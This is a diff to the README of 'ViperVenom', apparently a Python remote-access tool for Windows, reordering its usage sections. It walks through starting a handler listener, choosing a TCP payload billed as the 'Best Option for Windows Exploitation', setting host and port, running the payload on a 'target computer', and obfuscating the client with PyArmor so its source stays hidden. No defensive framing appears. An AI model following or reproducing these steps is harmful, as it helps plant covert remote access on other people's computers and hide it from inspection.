@@ -40,10 +40,6 @@ To connect a computer to the listener(you, most likely) you need to install a fe
 installation, and the Python extensions used in the client file, but you can use a Python compiler to create
 an executable.
 
-##### To connect your target computer:
-```
-$ Python3 <payload_name>.py
-```
 ## Recommeneded !
 As we are developing Revise7's ViperVenom, Revise7 tested [pyarmor](https://pypi.org/project/pyarmor/),
 PyArmor is a command line tool used to obfuscate python scripts, so you can encode your client file so the source won't be shown.
@@ -58,61 +54,6 @@ Thanks for PyArmor developers for the ability to encode Python code without brea
 * pillow
 * sounddevice
 * scipy
-
-# Setting Up ViperVenom
-
-After starting the software, to see which options are available, type "list" or "show list", the list of available options will be printed out
-```
-Landing/ViperVenom/ > show list
-
-1 | Start Handler Listener                             
-
-2 | Generate ViperVenom Payload
-```
-To use the listener option in the list, type
-```
-use 1
-Landing/ViperVenom/ > use 1
-/ViperVenom/ > 
-```
-After selecting 1, to view available payloads, type
-```
-show payloads
-
-ViperVenom/ > show payloads
-
-Available Payloads Any Windows:                                                                                                                                                                       
-1 | windows/vipervenom/tcp/payload | Best Option for Windows Exploitation.
-
-```
-You should be brought to the listener page.
-
-To select a payload
-```
-use windows/vipervenom/tcp/payload
-
-/ViperVenom/ > use windows/vipervenom/tcp/payload
-(Listener) Windows/ViperVenom/TCP/Payload > 
-```
-After selecting payload, you must set up your host IP and port that you want to listen to, make sure that your client file has the same host IP and port.
-```
-EXAMPLE:
-
-Listener) Windows/ViperVenom/TCP/Payload > set host YOURIP
-(Listener) Windows/ViperVenom/TCP/Payload > set port YOURPORT
-(Listener) Windows/ViperVenom/TCP/Payload > show host
-LHOST=YOURIP
-(Listener) Windows/ViperVenom/TCP/Payload > show port
-LPORT=YOURPORT
-(Listener) Windows/ViperVenom/TCP/Payload > 
-```
-After you set everything up, type run and enter to start the listener
-
-```
-(Listener) Windows/ViperVenom/TCP/Payload > run
-[*] Starting Listener...
-Listener Started, Waiting for Connections...
-```
 
 # Generating Payload (Updated 21/08/2021)
 In this section, you will be able to generate your own ViperVenom Python payload, convert it to an encoded shellcode payload, or an executable.
@@ -182,6 +123,66 @@ To generate the payload
 [*] Would You Like to Start Listener? 
 ```
 And you finished, your payload is ready, you can convert it to an executable or do whatever you want with it.
+
+# Setting Up ViperVenom
+
+After starting the software, to see which options are available, type "list" or "show list", the list of available options will be printed out
+```
+Landing/ViperVenom/ > show list
+
+1 | Start Handler Listener                             
+
+2 | Generate ViperVenom Payload
+```
+To use the listener option in the list, type
+```
+use 1
+Landing/ViperVenom/ > use 1
+/ViperVenom/ > 
+```
+After selecting 1, to view available payloads, type
+```
+show payloads
+
+ViperVenom/ > show payloads
+
+Available Payloads Any Windows:                                                                                                                                                                       
+1 | windows/vipervenom/tcp/payload | Best Option for Windows Exploitation.
+
+```
+You should be brought to the listener page.
+
+To select a payload
+```
+use windows/vipervenom/tcp/payload
+
+/ViperVenom/ > use windows/vipervenom/tcp/payload
+(Listener) Windows/ViperVenom/TCP/Payload > 
+```
+After selecting payload, you must set up your host IP and port that you want to listen to, make sure that your client file has the same host IP and port.
+```
+EXAMPLE:
+
+Listener) Windows/ViperVenom/TCP/Payload > set host YOURIP
+(Listener) Windows/ViperVenom/TCP/Payload > set port YOURPORT
+(Listener) Windows/ViperVenom/TCP/Payload > show host
+LHOST=YOURIP
+(Listener) Windows/ViperVenom/TCP/Payload > show port
+LPORT=YOURPORT
+(Listener) Windows/ViperVenom/TCP/Payload > 
+```
+After you set everything up, type run and enter to start the listener
+
+```
+(Listener) Windows/ViperVenom/TCP/Payload > run
+[*] Starting Listener...
+Listener Started, Waiting for Connections...
+```
+
+##### To connect your target computer:
+```
+$ Python3 <payload_name>.py
+```
 
 ## Special Commands
 
